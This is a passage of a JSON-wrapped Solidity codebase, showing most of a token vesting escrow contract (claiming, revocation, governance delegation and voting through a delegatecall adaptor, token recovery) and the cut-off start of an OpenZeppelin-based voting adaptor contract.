recipient.\n    function recipient() public pure returns (address) {\n        return _getArgAddress(40);\n    }\n\n    /// @notice The vesting start timestamp.\n    function startTime() public pure returns (uint40) {\n        return _getArgUint40(60);\n    }\n\n    /// @notice The vesting end timestamp.\n    function endTime() public pure returns (uint40) {\n        return _getArgUint40(65);\n    }\n\n    /// @notice The vesting cliff length.\n    function cliffLength() public pure returns (uint40) {\n        return _getArgUint40(70);\n    }\n\n    /// @notice The total amount of tokens locked.\n    function totalLocked() public pure returns (uint256) {\n        return _getArgUint256(75);\n    }\n\n    /// @notice The total amount of tokens that have been claimed.\n    uint256 public totalClaimed;\n\n    /// @notice The vesting end time or the time at which vesting was revoked.\n    uint40 public disabledAt;\n\n    /// @notice Whether vesting is fully revokable.\n    bool public isFullyRevokable;\n\n    /// @notice Whether vesting has been fully revoked.\n    bool public isFullyRevoked;\n\n    /// @notice Throws if called by any account other than the owner.\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /// @notice Throws if called by any account other than the owner or manager.\n    modifier onlyOwnerOrManager() {\n        _checkOwnerOrManager();\n        _;\n    }\n\n    /// @notice Throws if called by any account other than the recipient.\n    modifier onlyRecipient() {\n        _checkRecipient();\n        _;\n    }\n\n    /// @notice Throws if the voting adaptor is not set.\n    modifier whenVotingAdaptorIsSet() {\n        _checkVotingAdaptorIsSet();\n        _;\n    }\n\n    /// @notice Initializes the contract.\n    /// @param _isFullyRevokable Whether the tokens are fully revokable.\n    /// @param _initialDelegateParams The optional initial delegate information (skipped if empty bytes).\n    function initialize(bool _isFullyRevokable, bytes calldata _initialDelegateParams) external {\n        address _factory = address(factory());\n        uint256 _totalLocked = totalLocked();\n        uint40 _endTime = endTime();\n        IERC20 _token = token();\n\n        if (msg.sender != _factory) revert NOT_FACTORY(msg.sender);\n        if (_token.balanceOf(address(this)) < _totalLocked) revert INSUFFICIENT_BALANCE();\n\n        disabledAt = _endTime; // Set to maximum time\n        isFullyRevokable = _isFullyRevokable;\n\n        if (_initialDelegateParams.length != 0) _delegate(_initialDelegateParams);\n\n        emit VestingEscrowInitialized(\n            _factory,\n            recipient(),\n            address(_token),\n            _totalLocked,\n            startTime(),\n            _endTime,\n            cliffLength(),\n            _isFullyRevokable\n        );\n    }\n\n    /// @notice Get the number of unclaimed, vested tokens for recipient.\n    function unclaimed() public view returns (uint256) {\n        if (isFullyRevoked) return 0;\n\n        uint256 claimTime = Math.min(block.timestamp, disabledAt);\n        return _totalVestedAt(claimTime) - totalClaimed;\n    }\n\n    /// @notice Get the number of locked tokens for recipient.\n    function locked() public view returns (uint256) {\n        if (block.timestamp >= disabledAt) return 0;\n\n        return totalLocked() - _totalVestedAt(block.timestamp);\n    }\n\n    /// @notice Claim tokens which have vested.\n    /// @param beneficiary Address to transfer claimed tokens to.\n    /// @param amount Amount of tokens to claim.\n    function claim(address beneficiary, uint256 amount) external onlyRecipient returns (uint256) {\n        uint256 claimable = Math.min(unclaimed(), amount);\n        totalClaimed += claimable;\n\n        token().safeTransfer(beneficiary, claimable);\n        emit Claim(beneficiary, claimable);\n\n        return claimable;\n    }\n\n    /// @notice Delegate voting power of all available tokens.\n    /// @param params The ABI-encoded delegate params.\n    function delegate(bytes calldata params) external onlyRecipient returns (bytes memory) {\n        return _delegate(params);\n    }\n\n    /// @notice Participate in a governance vote using all available tokens on the contract's balance.\n    /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.\n    function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Participate in a governance vote with a reason using all available tokens on the contract's balance.\n    /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteWithReasonCalldata.\n    function voteWithReason(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.voteWithReason, (params)));\n    }\n\n    /// @notice Disable further flow of tokens and revoke the unvested part to owner.\n    function revokeUnvested() external onlyOwnerOrManager {\n        uint256 revokable = locked();\n        if (revokable == 0) revert NOTHING_TO_REVOKE();\n\n        disabledAt = uint40(block.timestamp);\n\n        token().safeTransfer(_owner(), revokable);\n        emit UnvestedTokensRevoked(msg.sender, revokable);\n    }\n\n    /// @notice Disable further flow of tokens and revoke all tokens to owner.\n    function revokeAll() external onlyOwner {\n        if (!isFullyRevokable) revert NOT_FULLY_REVOKABLE();\n        if (isFullyRevoked) revert ALREADY_FULLY_REVOKED();\n\n        uint256 revokable = locked() + unclaimed();\n        if (revokable == 0) revert NOTHING_TO_REVOKE();\n\n        isFullyRevoked = true;\n        disabledAt = uint40(block.timestamp);\n\n        token().safeTransfer(_owner(), revokable);\n        emit VestingFullyRevoked(msg.sender, revokable);\n    }\n\n    /// @notice Permanently disable full token revocation.\n    function permanentlyDisableFullRevocation() external onlyOwner {\n        if (!isFullyRevokable) revert NOT_FULLY_REVOKABLE();\n\n        isFullyRevokable = false;\n        emit FullRevocationPermanentlyDisabled(msg.sender);\n    }\n\n    /// @notice Recover any ERC20 token to the recipient.\n    /// @param token_ Address of the ERC20 token to recover.\n    /// @param amount Amount of tokens to recover.\n    function recoverERC20(address token_, uint256 amount) external {\n        uint256 recoverable = amount;\n        if (token_ == address(token())) {\n            uint256 available = token().balanceOf(address(this)) - (locked() + unclaimed());\n            recoverable = Math.min(recoverable, available);\n        }\n        if (recoverable > 0) {\n            IERC20(token_).safeTransfer(recipient(), recoverable);\n            emit ERC20Recovered(token_, recoverable);\n        }\n    }\n\n    /// @notice Recover any ETH to the recipient.\n    function recoverEther() external {\n        uint256 amount = address(this).balance;\n        if (amount > 0) {\n            payable(recipient()).sendValue(amount);\n            emit ETHRecovered(amount);\n        }\n    }\n\n    /// @dev Returns the factory owner.\n    function _owner() internal view returns (address) {\n        return factory().owner();\n    }\n\n    /// @dev Returns the factory manager.\n    function _manager() internal view returns (address) {\n        return factory().manager();\n    }\n\n    /// @dev Returns the factory voting adaptor.\n    function _votingAdaptor() internal view returns (address) {\n        return factory().votingAdaptor();\n    }\n\n    /// @dev Throws if called by any account other than the owner.\n    function _checkOwner() internal view {\n        if (msg.sender != _owner()) {\n            revert NOT_OWNER(msg.sender);\n        }\n    }\n\n    /// @dev Throws if called by any account other than the owner or manager.\n    function _checkOwnerOrManager() internal view {\n        if (msg.sender != _owner() && msg.sender != _manager()) {\n            revert NOT_OWNER_OR_MANAGER(msg.sender);\n        }\n    }\n\n    /// @dev Throws if called by any account other than the recipient.\n    function _checkRecipient() internal view {\n        if (msg.sender != recipient()) {\n            revert NOT_RECIPIENT(msg.sender);\n        }\n    }\n\n    /// @dev Throws if the voting adaptor is not set.\n    function _checkVotingAdaptorIsSet() internal view {\n        if (_votingAdaptor() == address(0)) {\n            revert VOTING_ADAPTOR_NOT_SET();\n        }\n    }\n\n    /// @notice Delegate voting power of all available tokens.\n    /// @param params The ABI-encoded delegate params.\n    function _delegate(bytes calldata params) internal whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.delegate, params));\n    }\n\n    /// @dev Returns the vested token amount at a specific time.\n    /// @param time The time to retrieve the vesting amount for.\n    function _totalVestedAt(uint256 time) internal pure returns (uint256) {\n        uint40 _startTime = startTime();\n        uint256 _totalLocked = totalLocked();\n        if (time < _startTime + cliffLength()) {\n            return 0;\n        }\n        return Math.min(_totalLocked * (time - _startTime) / (endTime() - _startTime), _totalLocked);\n    }\n}"
    },
    {
      "filename": "rio-vesting-escrow/src/adaptors/OZVotingAdaptor.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.23;\n\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IGovernor} from '@openzeppelin/contracts/governance/IGovernor.sol';\nimport {IVotes} from '@openzeppelin/contracts/governance/utils/IVotes.sol';\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {Address} from '@openzeppelin/contracts/utils/Address.sol';\nimport {IVotingAdaptor} from 'src/interfaces/IVotingAdaptor.sol';\n\ncontract OZVotingAdaptor is IVotingAdaptor, Ownable {\n    using SafeERC20 for IERC20;\n    using Address for address payable;\n\n    /// @notice The governor contract address.\n    address public immutable governor;\n\n    /// @notice The voting token contract address.\n    address public immutable votingToken;\n\n    constructor(address _governor, address _votingToken, address _owner) {\n        if (_owner == address(0)) revert INVALID_OWNER();\n        if (_governor == address(0)) revert INVALID_GOVERNOR();\n        if (_votingToken == address(0)) revert INVALID_VOTING_TOKEN();\n\n        governor = _governor;\n        votingToken = _votingToken;"
    }
  ]
}